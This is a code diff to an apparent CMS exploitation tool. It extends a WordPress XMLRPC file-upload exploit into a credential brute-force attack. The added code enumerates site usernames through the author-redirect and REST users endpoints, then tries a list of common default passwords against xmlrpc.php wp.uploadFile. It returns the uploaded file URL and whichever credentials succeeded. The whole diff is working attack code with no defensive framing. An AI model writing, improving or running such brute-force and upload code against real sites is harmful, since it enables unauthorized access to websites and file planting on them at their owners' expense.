@@ -464,15 +464,85 @@ async function exploitXmlrpcUpload(
   fileName: string,
 ): Promise<CmsExploitResult> {
   try {
-    // WordPress XMLRPC wp.uploadFile method
+    // WordPress XMLRPC wp.uploadFile method — brute force with common credentials
     const base64Content = Buffer.from(content).toString("base64");
-    const xmlPayload = `<?xml version="1.0"?>
+    
+    // Common WordPress credentials to try
+    const credentials = [
+      { user: "admin", pass: "admin" },
+      { user: "admin", pass: "admin123" },
+      { user: "admin", pass: "password" },
+      { user: "admin", pass: "123456" },
+      { user: "admin", pass: "admin@123" },
+      { user: "admin", pass: "password123" },
+      { user: "admin", pass: "12345678" },
+      { user: "admin", pass: "admin1234" },
+      { user: "admin", pass: "1234" },
+      { user: "administrator", pass: "administrator" },
+      { user: "administrator", pass: "admin123" },
+      { user: "administrator", pass: "password" },
+      { user: "root", pass: "root" },
+      { user: "root", pass: "toor" },
+      { user: "root", pass: "password" },
+      { user: "user", pass: "user" },
+      { user: "test", pass: "test" },
+      { user: "editor", pass: "editor" },
+      { user: "webmaster", pass: "webmaster" },
+      { user: "wp", pass: "wp" },
+    ];
+
+    // Also try to extract username from the site
+    try {
+      const authorResp = await fetch(`${targetUrl}/?author=1`, {
+        signal: AbortSignal.timeout(5000),
+        redirect: "follow",
+      });
+      const authorUrl = authorResp.url;
+      const authorMatch = authorUrl.match(/\/author\/([^\/]+)/);
+      if (authorMatch) {
+        const discoveredUser = authorMatch[1];
+        // Add discovered username with common passwords at the beginning
+        credentials.unshift(
+          { user: discoveredUser, pass: discoveredUser },
+          { user: discoveredUser, pass: "admin" },
+          { user: discoveredUser, pass: "password" },
+          { user: discoveredUser, pass: "123456" },
+          { user: discoveredUser, pass: `${discoveredUser}123` },
+          { user: discoveredUser, pass: `${discoveredUser}@123` },
+        );
+      }
+    } catch { /* ignore author discovery failure */ }
+
+    // Also try REST API user enumeration
+    try {
+      const usersResp = await fetch(`${targetUrl}/wp-json/wp/v2/users`, {
+        signal: AbortSignal.timeout(5000),
+      });
+      if (usersResp.ok) {
+        const users = await usersResp.json() as Array<{ slug?: string; name?: string }>;
+        for (const u of users.slice(0, 3)) {
+          if (u.slug) {
+            credentials.unshift(
+              { user: u.slug, pass: u.slug },
+              { user: u.slug, pass: "admin" },
+              { user: u.slug, pass: "password" },
+              { user: u.slug, pass: "123456" },
+            );
+          }
+        }
+      }
+    } catch { /* ignore user enumeration failure */ }
+
+    // Try each credential
+    for (const cred of credentials) {
+      try {
+        const xmlPayload = `<?xml version="1.0"?>
 <methodCall>
   <methodName>wp.uploadFile</methodName>
   <params>
     <param><value><int>1</int></value></param>
-    <param><value><string>admin</string></value></param>
-    <param><value><string>admin</string></value></param>
+    <param><value><string>${cred.user}</string></value></param>
+    <param><value><string>${cred.pass}</string></value></param>
     <param><value><struct>
       <member><name>name</name><value><string>${fileName}</string></value></member>
       <member><name>type</name><value><string>image/jpeg</string></value></member>
@@ -482,24 +552,34 @@ async function exploitXmlrpcUpload(
   </params>
 </methodCall>`;
 
-    const res = await fetch(`${targetUrl}/xmlrpc.php`, {
-      method: "POST",
-      body: xmlPayload,
-      headers: { "Content-Type": "text/xml" },
-      signal: AbortSignal.timeout(10000),
-    });
-    const text = await res.text();
+        const res = await fetch(`${targetUrl}/xmlrpc.php`, {
+          method: "POST",
+          body: xmlPayload,
+          headers: { "Content-Type": "text/xml" },
+          signal: AbortSignal.timeout(8000),
+        });
+        const text = await res.text();
 
-    if (text.includes("<name>url</name>") && text.includes("http")) {
-      const urlMatch = text.match(/<name>url<\/name>\s*<value>\s*<string>(.*?)<\/string>/);
-      const fileUrl = urlMatch ? urlMatch[1] : null;
-      return {
-        exploitName: "WordPress XMLRPC Upload",
-        success: true,
-        filePath: null,
-        fileUrl,
-        details: `File uploaded via XMLRPC wp.uploadFile`,
-      };
+        if (text.includes("<name>url</name>") && text.includes("http")) {
+          const urlMatch = text.match(/<name>url<\/name>\s*<value>\s*<string>(.*?)<\/string>/);
+          const fileUrl = urlMatch ? urlMatch[1] : null;
+          return {
+            exploitName: "WordPress XMLRPC Upload",
+            success: true,
+            filePath: null,
+            fileUrl,
+            details: `File uploaded via XMLRPC wp.uploadFile (${cred.user}:${cred.pass})`,
+          };
+        }
+        
+        // If we get "Incorrect username or password" keep trying
+        // If we get a different error (e.g., method not allowed), stop
+        if (!text.includes("Incorrect username or password") && !text.includes("faultCode")) {
+          break; // Non-auth error, stop trying
+        }
+      } catch {
+        continue;
+      }
     }
 
     return {
@@ -507,7 +587,7 @@ async function exploitXmlrpcUpload(
       success: false,
       filePath: null,
       fileUrl: null,
-      details: text.includes("faultString") ? "XMLRPC authentication failed" : "XMLRPC upload failed",
+      details: `XMLRPC brute force failed — tried ${credentials.length} credentials`,
     };
   } catch (e: any) {
     return {
